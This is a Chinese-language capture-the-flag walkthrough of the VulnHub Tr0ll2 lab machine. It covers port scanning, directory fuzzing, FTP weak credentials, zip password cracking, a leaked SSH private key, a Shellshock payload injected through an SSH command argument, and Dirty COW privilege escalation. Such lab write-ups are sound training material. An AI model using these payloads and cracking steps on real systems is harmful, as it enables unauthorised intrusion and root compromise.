## port scan

```shell
# Nmap 7.94SVN scan initiated Mon Jan 20 07:27:48 2025 as: nmap -p21,22,80 -sVC -O -oN nmap_result/detils 192.168.28.11
Nmap scan report for 192.168.28.11 (192.168.28.11)
Host is up (0.00081s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
MAC Address: 00:0C:29:3C:4E:80 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## web

robots.txt存在目录列表，保存下来进行爆破

```
wfuzz  -c -z file,dir.txt --hc 404 http://192.168.28.12/FUZZ
000000001:   301        9 L      28 W       313 Ch      "/noob"
000000017:   301        9 L      28 W       322 Ch      "/ok_this_is_it"
000000014:   301        9 L      28 W       320 Ch      "/dont_bother"
000000004:   301        9 L      28 W       320 Ch      "/keep_trying"
```

存在四个目录，访问下来都是troll

http://192.168.28.12/dont_bother/cat_the_troll.jpg

这个图片存在提示信息

```
strings cat_the_troll.jpg
```

```
Look Deep within y0ur_self for the answer
```

访问`y0ur_self`目录，发现base64编码的一个字典

进行解码

```
base64 -d answer.txt > answer-new.txt
```

然后尝试ssh，ftp爆破都没有结果

## ftp

发现ftp存在弱口令`Tr0ll:Tr0ll`

有个压缩包，有密码，拿刚才解码的字典尝试爆破

```
fcrackzip -D -p answer-new.txt -u -v lmao.zip
```

PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
```

ssh登录，但是连接不上

```shell
──(kali㉿kali)-[~/vulnhub/Tr0llv2]
└─$ ssh noob@192.168.28.12 -i noob 
TRY HARDER LOL!
Connection to 192.168.28.12 closed.
```

shellshock漏洞利用

https://xz.aliyun.com/t/14742

```
ssh noob@192.168.28.12 -i noob -t "() { :;};/bin/bash"
```

## 提权

```shell
noob@Tr0ll2:~$ uname -a
Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
noob@Tr0ll2:~$ cat /etc/*rele*
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04.1 LTS"
```

脏牛提权

```
searchsploit cow -m 40839
```

```shell
irefart@Tr0ll2:~# ls
core1  core2  core3  core4  goal  hardmode  lmao.zip  Proof.txt  ran_dir.py  reboot
firefart@Tr0ll2:~# cat Proof.txt 
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
```

